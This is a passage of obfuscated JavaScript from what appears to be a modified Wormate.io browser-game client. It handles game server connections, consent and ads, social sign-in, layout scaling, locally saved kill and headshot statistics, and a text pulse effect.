              _0x54b45a.Xg.Jf.yo();
              _0x54b45a.Xg.gl(_0x54b45a.Xg.Jf);
            }, function (_0x39c7f0) {
              _0x54b45a.Xg.Jf.yo();
              _0x54b45a.Xg.gl(_0x54b45a.Xg._k);
            }, function (_0x57b3e9, _0x2263c2) {
              var _0x2e2b03 = _0x57b3e9;
              _0x54b45a.Xg.Re.po(_0x2e2b03, _0x2263c2);
              _0x54b45a.Xg.Jf.po(_0x2e2b03, _0x2263c2);
            });
            if (_0x54b45a.kp() && !_0x54b45a.Pl()) {
              _0x54b45a.Xg.Yk.Fo(new _0x7f096e.Yp());
            } else {
              _0x54b45a.vq(true);
            }
          });
        };
        _0x54b45a.wq = function (_0x35bb6e) {
          if (_0x54b45a.ok.nk()) {
            var _0x23da33 = _0x54b45a.ok.gm();
            var _0x1f389e = _0x494ea6.H.J + "/pub/wuid/" + _0x23da33 + "/consent/change?value=" + _0x331039.W(_0x35bb6e);
            _0x331039.Aa(_0x1f389e, function () {}, function (_0x3cdc3d) {});
          }
        };
        _0x54b45a.to = function () {
          _0x2b2083++;
          if (_0x5c2dcc.on) {
            _0x2b2083 = 1;
          }
          if (!_0x494ea6.co.xq && _0x2b2083 >= _0x494ea6.co.fq) {
            _0x54b45a.Xg.gl(_0x54b45a.Xg.dl);
            _0x54b45a.ij.Ye(_0x7f096e.Pe.Se.Mf);
            _0x494ea6.co.yq.Ta();
          } else {
            _0x58cc94(_0x2b2083);
            _0x54b45a.zq();
          }
        };
        _0x54b45a.zq = function () {
          if (_0x54b45a.Mh.Aq()) {
            _0x54b45a.Xg.Re.qo();
            _0x54b45a.Xg.gl(_0x54b45a.Xg.Re);
            var _0x337164 = _0x54b45a.Xg.Jf.Ao();
            _0x7f096e.Cg.Ng(_0x7f096e.Cg.Ig, _0x337164, 30);
            var _0x2639e4 = _0x54b45a.Xg.Hi.Gi();
            _0x7f096e.Cg.Ng(_0x7f096e.Cg.Eg, _0x2639e4, 30);
            var _0x215b1a = 0;
            if (_0x54b45a.kq != null) {
              var _0x5771b6 = _0x54b45a.kq.coords.latitude;
              var _0xcbcb7d = _0x54b45a.kq.coords.longitude;
              _0x215b1a = _0x331039.ia(0, _0x331039.ha(32767, (_0x5771b6 + 90) / 180 * 32768)) << 1 | 1 | _0x331039.ia(0, _0x331039.ha(65535, (_0xcbcb7d + 180) / 360 * 65536)) << 16;
            }
            ;
            if (_0x54b45a.ok.nk()) {
              _0x54b45a.Bq(_0x337164, _0x215b1a);
            } else {
              var _0x39e02f = _0x54b45a.Xg.Jf.Ml();
              _0x7f096e.Cg.Ng(_0x7f096e.Cg.Jg, _0x39e02f, 30);
              var _0x247e8e = _0x54b45a.so.Zj(_0x7f096e._j.$j);
              _0x7f096e.Cg.Ng(_0x7f096e.Cg.Kg, _0x247e8e, 30);
              _0x54b45a.Cq(_0x337164, _0x215b1a);
            }
          }
        };
        _0x54b45a.Bq = function (_0x2725bb, _0x52f24e) {
          var _0x20c161;
          var _0x185146 = _0x54b45a.ok.gm();
          var _0x5cbe66 = _0x54b45a.Xg.Jf.Ml();
          var _0x4004f5 = _0x54b45a.so.Zj(_0x7f096e._j.$j);
          var _0x1c1b65 = _0x54b45a.so.Zj(_0x7f096e._j.ak);
          var _0x5bb2c4 = _0x54b45a.so.Zj(_0x7f096e._j.bk);
          _0x1e50f1(_0x4004f5, _0x1c1b65, _0x5bb2c4, _0x54b45a.so.Zj(_0x7f096e._j.dk), _0x54b45a.so.Zj(_0x7f096e._j.ck), _0x5cbe66);
          var _0x2b277e = (_0x5cbe66 = (_0x5cbe66 = _0x207b06.f).trim()).replace(_0x5cbe66.substr(-7), "");
          if (_0x2b277e != _0x207b06.s_n) {
            _0x207b06.s_n = _0x2b277e;
            _0x5ae263(_0x2b277e.trim());
          }
          var _0x56b6bc = _0x494ea6.H.J + "/pub/wuid/" + _0x185146 + "/start?gameMode=" + _0x331039.W(_0x2725bb) + "&gh=" + _0x52f24e + "&nickname=" + _0x331039.W(_0x31650d(_0x5cbe66, true)) + "&skinId=" + _0x207b06.a + "&eyesId=" + _0x207b06.b + "&mouthId=" + _0x207b06.c + "&glassesId=" + _0x207b06.d + "&hatId=" + _0x207b06.e;
          _0x331039.Aa(_0x56b6bc, function () {
            _0x54b45a.Xg.gl(_0x54b45a.Xg._k);
          }, function (_0x3fd666) {
            if (_0x3fd666.code === 1460) {
              _0x54b45a.Xg.gl(_0x54b45a.Xg.Wk);
              try {
                ga("send", "event", "restricted", _0x494ea6.H.I + "_tick");
              } catch (_0x426dee) {}
            } else if (_0x3fd666.code !== 1200) {
              _0x54b45a.Xg.gl(_0x54b45a.Xg._k);
            } else {
              var _0x4c83ae = _0x3fd666.server_url;
              var _0x10c4c3 = _0x5e9153(_0x4c83ae.substr(-10, 4));
              if ($("#port_id").val() === "") {
                $("#port_id_s").val(_0x4c83ae);
                $("#port_name_s").val(_0x10c4c3);
                _0x207b06.pi = _0x4c83ae;
                _0x207b06.pn = _0x10c4c3;
                localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
                _0x322fdb.text = "" + _0x10c4c3;
                createCircle();
                _0x54b45a.Mh.Dq(_0x4c83ae, _0x185146);
              } else {
                $("#port_id_s").val($("#port_id").val());
                $("#port_name_s").val($("#port_name").val());
                _0x207b06.pi = $("#port_id").val();
                _0x207b06.pn = $("#port_name").val();
                localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
                _0x322fdb.text = "" + $("#port_name").val();
                createCircle();
                _0x54b45a.Mh.Dq($("#port_id").val(), _0x185146);
              }
            }
          });
        };
        _0x54b45a.Cq = function (_0x4608af, _0x4e06ed) {
          var _0x48d36f = _0x54b45a.Xg.Jf.Ml();
          var _0x8288f8 = _0x54b45a.so.Zj(_0x7f096e._j.$j);
          var _0x597074 = _0x494ea6.H.J + "/pub/wuid/guest/start?gameMode=" + _0x331039.W(_0x4608af) + "&gh=" + _0x4e06ed + "&nickname=" + _0x331039.W(_0x48d36f) + "&skinId=" + _0x331039.W(_0x8288f8);
          _0x331039.Aa(_0x597074, function () {
            _0x54b45a.Xg.gl(_0x54b45a.Xg._k);
          }, function (_0x18c4d8) {
            if (_0x18c4d8.code === 1460) {
              _0x54b45a.Xg.gl(_0x54b45a.Xg.Wk);
              try {
                ga("send", "event", "restricted", _0x494ea6.H.I + "_tick");
              } catch (_0x46d4c2) {}
            } else if (_0x18c4d8.code !== 1200) {
              _0x54b45a.Xg.gl(_0x54b45a.Xg._k);
            } else {
              var _0x1cc3b3 = _0x18c4d8.server_url;
              var _0x2db288 = _0x5e9153(_0x1cc3b3.substr(-10, 4));
              if ($("#port_id").val() === "") {
                $("#port_id_s").val(_0x1cc3b3);
                $("#port_name_s").val(_0x2db288);
                _0x207b06.pi = _0x1cc3b3;
                _0x207b06.pn = _0x2db288;
                localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
                _0x322fdb.text = "" + _0x2db288;
                createCircle();
                _0x54b45a.Mh.Eq(_0x1cc3b3, _0x48d36f, _0x8288f8);
              } else {
                $("#port_id_s").val($("#port_id").val());
                $("#port_name_s").val($("#port_name").val());
                _0x207b06.pi = $("#port_id").val();
                _0x207b06.pn = $("#port_name").val();
                localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
                _0x322fdb.text = "" + $("#port_name").val();
                createCircle();
                _0x54b45a.Mh.Eq($("#port_id").val(), _0x48d36f, _0x8288f8);
              }
            }
          });
        };
        _0x54b45a.tq = function (_0x532e8b, _0x326f65) {
          var _0x245d63 = _0x54b45a.Xg.Jf.Ml();
          _0x54b45a.Xg.Kf.jo(_0x532e8b, _0x326f65, _0x245d63);
          _0x54b45a.ij.Ye(_0x7f096e.Pe.Se.Lf);
          _0x54b45a.Xg.gl(_0x54b45a.Xg.Kf.io());
        };
        _0x54b45a.wo = function () {
          if (!_0x54b45a.xo()) {
            return _0x54b45a.so.hk();
          }
          ;
          var _0x5970fd = parseInt(_0x7f096e.Cg.Og(_0x7f096e.Cg.Kg));
          if (_0x5970fd != null && _0x54b45a.so.ik(_0x5970fd, _0x7f096e._j.$j)) {
            return _0x5970fd;
          } else {
            return _0x54b45a.so.hk();
          }
        };
        _0x54b45a.Bo = function (_0x5ae1aa) {
          _0x7f096e.Cg.Ng(_0x7f096e.Cg.Mg, _0x5ae1aa ? "true" : "false", 1800);
        };
        _0x54b45a.xo = function () {
          return _0x7f096e.Cg.Og(_0x7f096e.Cg.Mg) === "true";
        };
        _0x54b45a.vq = function (_0x4efd17) {
          if (_0x4efd17 !== _0x54b45a.gq) {
            _0x54b45a.gq = _0x4efd17;
            var _0x597777 = _0x597777 || {};
            _0x597777.consented = _0x4efd17;
            _0x597777.gdprConsent = _0x4efd17;
            _0x494ea6.co.do.Sa();
            _0x494ea6.co.sq.Sa();
            _0x494ea6.co.yq.Sa(function (_0x24c971) {
              if (_0x24c971) {
                _0x58cc94(_0x2b2083 = 0);
              }
              _0x54b45a.zq();
            });
          }
        };
        _0x54b45a.Xp = function (_0x1ca68e, _0x330e79) {
          _0x7f096e.Cg.Ng(_0x7f096e.Cg.Dg, _0x1ca68e ? "true" : "false");
          if (_0x330e79) {
            _0x54b45a.wq(_0x1ca68e);
          }
          _0x54b45a.vq(_0x1ca68e);
        };
        _0x54b45a.Pl = function () {
          return _0x7f096e.Cg.Og(_0x7f096e.Cg.Dg) === "true";
        };
        _0x54b45a.kp = function () {
          try {
            return !!_0x7f096e.c.isIPInEEA || _0x54b45a.kq != null && !!_0x494ea6.Pg.Qg(_0x54b45a.kq.coords.latitude, _0x54b45a.kq.coords.longitude);
          } catch (_0xa8f02b) {
            return true;
          }
        };
        _0x54b45a.ug = function () {
          _0x54b45a.iq = _0x331039.Ca();
          _0x54b45a.jq = _0x54b45a.iq - _0x54b45a.hq;
          _0x54b45a.Mh.Uh(_0x54b45a.iq, _0x54b45a.jq);
          _0x54b45a.Xg.Uh(_0x54b45a.iq, _0x54b45a.jq);
          _0x54b45a.hq = _0x54b45a.iq;
        };
        _0x54b45a.qg = function () {
          _0x54b45a.Xg.qg();
        };
        return _0x54b45a;
      }();
    };
    _0x7f096e.nq = function () {
      'use strict';

      var _0x2af1e5 = {
        Jq: 30,
        Kq: new _0x4ead11.j(100),
        Lq: 0,
        Mq: 0,
        Nq: 0,
        Oq: 0,
        Pq: 0,
        Qq: 0,
        go: 0,
        Rq: null,
        Sq: 300,
        qq: function () {},
        rq: function () {},
        uq: function () {},
        pq: function () {},
        Qh: new _0x7f096e.dh(),
        oq: null,
        Lh: null,
        nj: {},
        li: {},
        jj: 12.5,
        Nh: 40,
        Tq: 1,
        Uq: -1,
        Vq: 1,
        Wq: 1,
        Xq: -1,
        Yq: -1,
        Zq: 1,
        $q: 1,
        ar: -1,
        oi: 500,
        ei: 500
      };
      _0x2af1e5.Qh.gh = 500;
      _0x2af1e5.Lh = new _0x7f096e.Ui(_0x2af1e5.Qh);
      _0x2af1e5.Sa = function () {
        _0x2af1e5.Lh._i(ooo.Xg.Kf.Wg);
        _0x331039.X(function () {
          _0x2af1e5.uq(function (_0x4f158b, _0x1a13f1) {
            _0x2af1e5.br(_0x4f158b, _0x1a13f1);
          });
        }, _0x207b06.sm);
      };
      _0x2af1e5.Ph = function (_0x4a1bdf, _0x55071c, _0x1260b9, _0x4c9af7) {
        _0x2af1e5.Uq = _0x4a1bdf;
        _0x2af1e5.Vq = _0x55071c;
        _0x2af1e5.Wq = _0x1260b9;
        _0x2af1e5.Xq = _0x4c9af7;
        _0x2af1e5.cr();
      };
      _0x2af1e5.dr = function (_0x23162b) {
        _0x2af1e5.Tq = _0x23162b;
        _0x2af1e5.cr();
      };
      _0x2af1e5.cr = function () {
        _0x2af1e5.Yq = _0x2af1e5.Uq - _0x2af1e5.Tq;
        _0x2af1e5.Zq = _0x2af1e5.Vq + _0x2af1e5.Tq;
        _0x2af1e5.$q = _0x2af1e5.Wq - _0x2af1e5.Tq;
        _0x2af1e5.ar = _0x2af1e5.Xq + _0x2af1e5.Tq;
      };
      _0x2af1e5.Uh = function (_0x357863, _0x46a65e) {
        _0x2af1e5.Nq += _0x46a65e;
        _0x2af1e5.Mq -= _0x2af1e5.Lq * 0.2 * _0x46a65e;
        _0x2af1e5.oq.yi();
        if (_0x2af1e5.Rq != null && (_0x2af1e5.go === 2 || _0x2af1e5.go === 3)) {
          _0x2af1e5.er(_0x357863, _0x46a65e);
          _0x2af1e5.Nh = 4 + _0x2af1e5.jj * _0x2af1e5.Lh.Id;
        }
        var _0x4a86ce = 1000 / _0x331039.ia(1, _0x46a65e);
        var _0x1ea318 = 0;
        for (var _0xb331ea = 0; _0xb331ea < _0x2af1e5.Kq.length - 1; _0xb331ea++) {
          _0x1ea318 += _0x2af1e5.Kq[_0xb331ea];
          _0x2af1e5.Kq[_0xb331ea] = _0x2af1e5.Kq[_0xb331ea + 1];
        }
        ;
        _0x2af1e5.Kq[_0x2af1e5.Kq.length - 1] = _0x4a86ce;
        _0x2af1e5.Jq = (_0x1ea318 + _0x4a86ce) / _0x2af1e5.Kq.length;
      };
      _0x2af1e5.fr = function (_0x2f921c, _0x9c8595) {
        return _0x2f921c > _0x2af1e5.Yq && _0x2f921c < _0x2af1e5.Zq && _0x9c8595 > _0x2af1e5.$q && _0x9c8595 < _0x2af1e5.ar;
      };
      _0x2af1e5.er = function (_0x12f75c, _0x409f7f) {
        var _0x39c8fd = (_0x2af1e5.Nq + _0x2af1e5.Mq - _0x2af1e5.Oq) / (_0x2af1e5.Pq - _0x2af1e5.Oq);
        _0x2af1e5.Lh.Pj(_0x12f75c, _0x409f7f);
        _0x2af1e5.Lh.Qj(_0x12f75c, _0x409f7f, _0x39c8fd, _0x2af1e5.fr);
        var _0x368d51 = 0;
        for (var _0x4c5a0a in _0x2af1e5.li) {
          var _0x27367e = _0x2af1e5.li[_0x4c5a0a];
          _0x27367e.Pj(_0x12f75c, _0x409f7f);
          _0x27367e.Qj(_0x12f75c, _0x409f7f, _0x39c8fd, _0x2af1e5.fr);
          if (_0x27367e.cj && _0x27367e.Id > _0x368d51) {
            _0x368d51 = _0x27367e.Id;
          }
          if (!_0x27367e.bj && (!!(_0x27367e.Lj < 0.005) || !_0x27367e.cj)) {
            _0x27367e.$i();
            delete _0x2af1e5.li[_0x27367e.ki.Je];
          }
        }
        ;
        _0x2af1e5.dr(_0x368d51 * 3);
        for (var _0x2d7d0a in _0x2af1e5.nj) {
          var _0x3b1763 = _0x2af1e5.nj[_0x2d7d0a];
          _0x3b1763.Pj(_0x12f75c, _0x409f7f);
          _0x3b1763.Qj(_0x12f75c, _0x409f7f, _0x2af1e5.fr);
          if (_0x3b1763.tj && (_0x3b1763.Lj < 0.005 || !_0x2af1e5.fr(_0x3b1763.Fj, _0x3b1763.Gj))) {
            _0x3b1763.$i();
            delete _0x2af1e5.nj[_0x3b1763.ki.Je];
          }
        }
      };
      _0x2af1e5.Si = function (_0xb60436, _0x739e52) {
        if (_0x2af1e5.go === 1) {
          _0x2af1e5.go = 2;
          _0x2af1e5.qq();
        }
        var _0x1692f4 = ooo.iq;
        _0x2af1e5.Qq = _0xb60436;
        if (_0xb60436 === 0) {
          _0x2af1e5.Oq = _0x1692f4 - 95;
          _0x2af1e5.Pq = _0x1692f4;
          _0x2af1e5.Nq = _0x2af1e5.Oq;
          _0x2af1e5.Mq = 0;
        } else {
          _0x2af1e5.Oq = _0x2af1e5.Pq;
          _0x2af1e5.Pq = _0x2af1e5.Pq + _0x739e52;
        }
        var _0x88332f = _0x2af1e5.Nq + _0x2af1e5.Mq;
        _0x2af1e5.Lq = (_0x88332f - _0x2af1e5.Oq) / (_0x2af1e5.Pq - _0x2af1e5.Oq);
      };
      _0x2af1e5.uj = function () {
        if (_0x2af1e5.go === 1 || _0x2af1e5.go === 2) {
          _0x2af1e5.go = 3;
          var _0x50551c = _0x2af1e5.Rq;
          _0x331039.Y(function () {
            if (_0x2af1e5.go === 3) {
              _0x2af1e5.go = 0;
            }
            if (_0x50551c != null && _0x50551c === _0x2af1e5.Rq) {
              _0x2af1e5.Rq.close();
              _0x2af1e5.Rq = null;
            }
          }, 5000);
          _0x2af1e5.rq();
        }
      };
      _0x2af1e5.Aq = function () {
        return _0x2af1e5.go !== 2 && (_0x2af1e5.go = 1, _0x2af1e5.oq.xi(), _0x2af1e5.nj = {}, _0x2af1e5.li = {}, _0x2af1e5.Lh.xn(), _0x2af1e5.Rq != null && (_0x2af1e5.Rq.close(), _0x2af1e5.Rq = null), true);
      };
      _0x2af1e5.gr = function () {
        _0x2af1e5.Rq = null;
        _0x2af1e5.oq.xi();
        if (_0x2af1e5.go !== 3) {
          _0x2af1e5.pq();
        }
        _0x2af1e5.go = 0;
      };
      _0x2af1e5.Dq = function (_0x46f9c8, _0x486146) {
        _0x2af1e5.hr(_0x46f9c8, function () {
          var _0x13a2c2 = _0x331039.ha(2048, _0x486146.length);
          var _0x2adb22 = new _0x7f096e.Fa(6 + _0x13a2c2 * 2);
          var _0x510852 = new _0x7f096e.Oa(new _0x7f096e.Ga(_0x2adb22));
          _0x510852.Pa(129);
          _0x510852.Qa(2800);
          _0x510852.Pa(1);
          _0x510852.Qa(_0x13a2c2);
          for (var _0x2a8a50 = 0; _0x2a8a50 < _0x13a2c2; _0x2a8a50++) {
            _0x510852.Qa(_0x486146.charCodeAt(_0x2a8a50));
          }
          ;
          _0x2af1e5.ir(_0x2adb22);
        });
      };
      _0x2af1e5.Eq = function (_0x4efcc2, _0x12f57a, _0xb480ab) {
        _0x2af1e5.hr(_0x4efcc2, function () {
          var _0x3f32cf = _0x331039.ha(32, _0x12f57a.length);
          var _0xcd8383 = new _0x7f096e.Fa(7 + _0x3f32cf * 2);
          var _0x1df9ad = new _0x7f096e.Oa(new _0x7f096e.Ga(_0xcd8383));
          _0x1df9ad.Pa(129);
          _0x1df9ad.Qa(2800);
          _0x1df9ad.Pa(0);
          _0x1df9ad.Qa(_0xb480ab);
          _0x1df9ad.Pa(_0x3f32cf);
          for (var _0x5da929 = 0; _0x5da929 < _0x3f32cf; _0x5da929++) {
            _0x1df9ad.Qa(_0x12f57a.charCodeAt(_0x5da929));
          }
          ;
          _0x2af1e5.ir(_0xcd8383);
        });
      };
      _0x2af1e5.ir = function (_0x119565) {
        try {
          if (_0x2af1e5.Rq != null && _0x2af1e5.Rq.readyState === _0x4ead11.i.OPEN) {
            _0x2af1e5.Rq.send(_0x119565);
          }
        } catch (_0x18d27e) {
          _0x2af1e5.gr();
        }
      };
      _0x2af1e5.br = function (_0xfd03f4, _0x2b0937) {
        var _0x249802 = ((_0x2b0937 ? 128 : 0) | _0x331039.da(_0xfd03f4) / _0x494ea6.S * 128 & 127) & 255;
        var _0x59bf05 = false;
        try {
          if (typeof ooo !== "undefined" && ooo.ok && ooo.ok.rk) {
            _0x59bf05 = ooo.ok.rk(478, "GLASSES");
          }
        } catch (_0x19e18a) {
          _0x59bf05 = false;
        }
        if (_0x59bf05) {
          var _0x3a9875 = new _0x7f096e.Fa(1);
          new _0x7f096e.Oa(new _0x7f096e.Ga(_0x3a9875)).Pa(_0x249802);
          _0x2af1e5.ir(_0x3a9875);
          _0x2af1e5.Sq = _0x249802;
        } else if (_0x2af1e5.Sq !== _0x249802) {
          var _0x3a9875 = new _0x7f096e.Fa(1);
          new _0x7f096e.Oa(new _0x7f096e.Ga(_0x3a9875)).Pa(_0x249802);
          _0x2af1e5.ir(_0x3a9875);
          _0x2af1e5.Sq = _0x249802;
        }
      };
      _0x2af1e5.hr = function (_0x35a5ba, _0x2da674) {
        let _0x177b24;
        if (!_0x5c2dcc.on && _0x207b06.mobile) {
          _0x177b24 = _0x431976(_0x207b06.mobile);
        }
        var _0x4a8861 = _0x2af1e5.Rq = new _0x4ead11.i(_0x35a5ba);
        _0x4a8861.binaryType = "arraybuffer";
        _0x4a8861.onopen = function () {
          _0x623736(_0x207b06, oeo, "open");
          _0x1c7046(_0x207b06, oeo, "hidden");
          if (_0x2af1e5.Rq === _0x4a8861) {
            _0x2da674();
          }
        };
        _0x4a8861.onclose = function () {
          _0x623736(_0x207b06, oeo, "close");
          _0x1c7046(_0x207b06, oeo, "hidden");
          if (!_0x5c2dcc.on && _0x207b06.mobile && _0x177b24) {
            _0x177b24.destroy();
          }
          if (_0x2af1e5.Rq === _0x4a8861) {
            _0x2af1e5.gr();
          }
        };
        _0x4a8861.onerror = function (_0x453873) {
          if (_0x2af1e5.Rq === _0x4a8861) {
            _0x2af1e5.gr();
          }
          if (!_0x5c2dcc.on && _0x207b06.mobile && _0x177b24) {
            _0x177b24.destroy();
          }
        };
        _0x4a8861.onmessage = function (_0x288a72) {
          if (_0x2af1e5.Rq === _0x4a8861) {
            _0x2af1e5.oq.wi(_0x288a72.data);
          }
        };
      };
      return _0x2af1e5;
    };
    _0x5d16c7 = _0x7f096e.c.ENV;
    (_0x157ca6 = {}).main = {
      do: _0x331039.Ua("aqnvgcpz05orkobh", "WRM_wormate-io_300x250"),
      sq: _0x331039.Ua("ltmolilci1iurq1i", "wormate-io_970x250"),
      yq: _0x331039.Ra(),
      fq: 4,
      xq: false,
      bo: true
    };
    _0x157ca6.miniclip = {
      do: _0x331039.Ua("aqnvgcpz05orkobh", "WRM_wormate-io_300x250"),
      sq: _0x331039.Ua("ltmolilci1iurq1i", "wormate-io_970x250"),
      yq: _0x331039.Ra(),
      fq: 4,
      xq: false,
      bo: false
    };
    if (!(_0x153201 = _0x157ca6[_0x5d16c7])) {
      _0x153201 = _0x157ca6.main;
    }
    _0x494ea6.co = _0x153201;
    $(function () {
      FastClick.attach(_0x7f096e.d.body);
    });
    addEventListener("contextmenu", function (_0x13b547) {
      _0x13b547.preventDefault();
      _0x13b547.stopPropagation();
      return false;
    });
    _0x7f096e.c.fbAsyncInit = function () {
      var _0x17c62;
      FB.init(((_0x17c62 = {}).appId = "861926850619051", _0x17c62.cookie = true, _0x17c62.xfbml = true, _0x17c62.status = true, _0x17c62.version = "v14.0", _0x17c62));
    };
    _0x331039.ba("//connect.facebook.net/" + _0x494ea6.H.Q + "/sdk.js", ((_0x182de3 = {}).id = "facebook-jssdk", _0x182de3.async = true, _0x182de3.defer = true, _0x182de3.crossorigin = "anonymous", _0x182de3));
    _0x331039.ba("//apis.google.com/js/api:client.js", null, function () {
      gapi.load("auth2", function () {
        var _0xa24697;
        GoogleAuth = gapi.auth2.init(((_0xa24697 = {}).client_id = "959425192138-qjq23l9e0oh8lgd2icnblrbfblar4a2f.apps.googleusercontent.com", _0xa24697));
      });
    });
    _0x331039.ba("https://accounts.google.com/gsi/client");
    (function () {
      try {
        let _0x3e3f5f = document.getElementsByTagName("head")[0];
        let _0x39ce21 = document.createElement("link");
        _0x39ce21.rel = "stylesheet";
        _0x39ce21.type = "text/css";
        _0x39ce21.href = _0x207b06.s_l + "/css/game.css";
        _0x3e3f5f.appendChild(_0x39ce21);
      } catch (_0xa60fd7) {
        console.error(_0xa60fd7);
      }
    })();
    (ooo = _0x331039.dq()).Sa();
    oeo = ooo.Xg.Kf.Wg.Ah;
    (function _0x2e5761() {
      requestAnimationFrame(_0x2e5761);
      ooo.ug();
    })();
    (function () {
      function _0x3aadea() {
        var _0x2d7396 = _0x438878.width();
        var _0x23e456 = _0x438878.height();
        var _0x589d9a = _0x1b5985.outerWidth();
        var _0x163030 = _0x1b5985.outerHeight();
        var _0x5a01c8 = _0x36a51d.outerHeight();
        var _0x551d14 = _0x232edf.outerHeight();
        var _0xb0a083 = _0x331039.ha(1, _0x331039.ha((_0x23e456 - _0x551d14 - _0x5a01c8) / _0x163030, _0x2d7396 / _0x589d9a));
        var _0x14bdf8 = `translate(-50%, -50%) scale(${_0xb0a083})`;
        _0x1b5985.css("-webkit-transform", _0x14bdf8);
        _0x1b5985.css("-moz-transform", _0x14bdf8);
        _0x1b5985.css("-ms-transform", _0x14bdf8);
        _0x1b5985.css("-o-transform", _0x14bdf8);
        _0x1b5985.css("transform", _0x14bdf8);
        ooo.qg();
        _0x7f096e.c.scrollTo(0, 1);
      }
      var _0x438878 = $("body");
      var _0x1b5985 = $("#stretch-box");
      var _0x36a51d = $("#markup-header");
      var _0x232edf = $("#markup-footer");
      _0x3aadea();
      $(_0x7f096e.c).resize(_0x3aadea);
    })();
    let _0x20dc71 = function (_0x2c162b, _0x352b69) {
      var _0x866579 = $("#saveGame");
      _0x866579.prop("checked", _0x2c162b.saveGame);
      _0x866579.change(function () {
        if (!this.checked) {
          let _0x5b506b = confirm(localStorage.getItem("ccg_0"));
          $(this).prop("checked", !_0x5b506b);
          if (!this.checked) {
            _0x623736(_0x2c162b, _0x352b69, "zero");
          }
        }
        ;
        _0x2c162b.saveGame = this.checked;
        _0x352b69.value2_hs.alpha = this.checked ? 1 : 0;
        _0x352b69.value2_kill.alpha = this.checked ? 1 : 0;
        localStorage.setItem("SaveGameup", this.checked ? JSON.stringify(_0x2c162b) : null);
      });
    };
    let _0x623736 = function (_0x266fc2, _0x14d32e, _0x4eb474, _0x18a794) {
      let _0x553c82 = function (_0x2ba9ac, _0x4c7b68, _0x2a9168, _0x1b95c3) {
        _0x14d32e.value1_hs.text = _0x4c7b68;
        _0x14d32e.value2_hs.text = _0x2a9168;
        _0x14d32e.value1_kill.text = _0x2ba9ac;
        _0x14d32e.value2_kill.text = _0x1b95c3;
      };
      if (_0x4eb474 === "count") {
        _0x266fc2.kill = (_0x266fc2.kill || 0) + (_0x18a794 ? 0 : 1);
        _0x266fc2.headshot = (_0x266fc2.headshot || 0) + (_0x18a794 ? 1 : 0);
        _0x266fc2.s_kill += _0x18a794 ? 0 : 1;
        _0x266fc2.s_headshot += _0x18a794 ? 1 : 0;
        _0x553c82(_0x266fc2.kill, _0x266fc2.headshot, _0x266fc2.s_headshot, _0x266fc2.s_kill);
        if (_0x18a794 && _0x553c82 && _0x553c82.soundEnabled) {
          if (_0x266fc2.headshot % 10 === 0 && _0x266fc2.headshot > 0) {
            window.playMonsterSound();
          }
        }
      }
      if (_0x4eb474 === "open") {
        _0x266fc2.kill = 0;
        _0x266fc2.headshot = 0;
        _0x266fc2.s = true;
        _0x266fc2.st = true;
        _0x266fc2.z = 1;
        _0x266fc2.fz = true;
        _0x314f33.texture = _0x4e187f;
        if (_0x266fc2.saveGame) {
          _0x553c82(_0x266fc2.kill, _0x266fc2.headshot, _0x266fc2.s_headshot, _0x266fc2.s_kill);
        }
        _0x183d07();
      }
      if (_0x4eb474 === "close") {
        _0x266fc2.s = false;
        _0xfa7e1.texture = _0x548fe1;
        _0x2e32b4.texture = _0x4de304;
        _0x33e15a = false;
        _0x38aca6 = 55;
        _0xb42c97 = 1;
        _0x13b8e7 = true;
        clearInterval(_0x18dfde);
        _0x18dfde = null;
        clearInterval(_0x8a94c9);
        _0x8a94c9 = null;
        _0x266fc2.fz = true;
        _0x266fc2.mo1.x = -1;
        _0x266fc2.mo1.y = -1;
        _0x266fc2.mo2.x = -1;
        _0x266fc2.mo2.y = -1;
        const _0x365b20 = document.querySelectorAll("audio");
        _0x365b20.forEach(_0x295e54 => {
          _0x295e54.pause();
          _0x295e54.currentTime = 0;
        });
        if (_0x5c2dcc && _0x5c2dcc.on && _0x266fc2.mobile && _0x266fc2.mo == 6 && _0x266fc2.j) {
          _0x266fc2.j.destroy();
        }
        if (_0x266fc2.saveGame) {
          _0x266fc2.died = (_0x266fc2.died || 0) + 1;
        } else {
          _0x623736(_0x266fc2, _0x14d32e, "zero");
        }
      }
      if (_0x4eb474 === "zero") {
        _0x266fc2.kill = 0;
        _0x266fc2.s_kill = 0;
        _0x266fc2.headshot = 0;
        _0x266fc2.s_headshot = 0;
        _0x266fc2.died = 0;
      }
      localStorage.setItem("SaveGameup", JSON.stringify(_0x266fc2));
    };
    window.pulseEnabled = true;
    function _0x28ed32() {
      const _0x45d404 = localStorage.getItem("wupPulseEnabled");
      if (_0x45d404 !== null) {
        window.pulseEnabled = _0x45d404 === "true";
      }
    }
    function _0x411a17() {
      localStorage.setItem("wupPulseEnabled", window.pulseEnabled.toString());
    }
    function _0x712507() {
      _0x28ed32();
      if (window._pulseFunctionInstalled) {
        return;
      }
      window._pulseFunctionInstalled = true;
      function _0x142c91() {
        if (!window.pulseEnabled) {
          ["pk0", "pk1", "pk2", "pk3", "pk4", "pk5", "pk6"].forEach(_0x1795af => {
            const _0x5958e0 = globalThis.config?.[_0x1795af];
            if (_0x5958e0 && _0x5958e0._pulseStarted) {
              _0x57e992(_0x5958e0);
            }
          });
          return;
        }
        ["pk0", "pk1", "pk2", "pk3", "pk4", "pk5", "pk6"].forEach(_0x965927 => {
          const _0x5f4eb5 = globalThis.config?.[_0x965927];
          if (!_0x5f4eb5 || !_0x5f4eb5.text) {
            return;
          }
          const _0xa3dd2c = _0x5f4eb5.style && _0x5f4eb5.style.fill === "#f9cc0b";
          const _0x166d88 = _0x5f4eb5.style && _0x5f4eb5.style.fill === "#fdbf5f";
          if (_0xa3dd2c || _0x166d88) {
            const _0x4154d8 = parseInt(_0x5f4eb5.text);
            if (!isNaN(_0x4154d8) && _0x4154d8 > 0 && _0x4154d8 <= 5) {
              _0x46cb2e(_0x5f4eb5);
            } else {
              _0x57e992(_0x5f4eb5);
            }
          } else {
            _0x57e992(_0x5f4eb5);
          }
        });
      }
      function _0x46cb2e(_0x35c40d) {
        if (_0x35c40d._pulseStarted) {
          return;
        }
        _0x35c40d._originalColor = _0x35c40d.style.fill;
        _0x35c40d._originalFontSize = _0x35c40d.style.fontSize || "16px";
        _0x35c40d._pulseStarted = true;
        _0x35c40d._lastPulseTime = 0;
        _0x35c40d._pulseInterval = setInterval(() => {
          const _0x46bd71 = Date.now();
          if (_0x46bd71 - _0x35c40d._lastPulseTime > 800) {
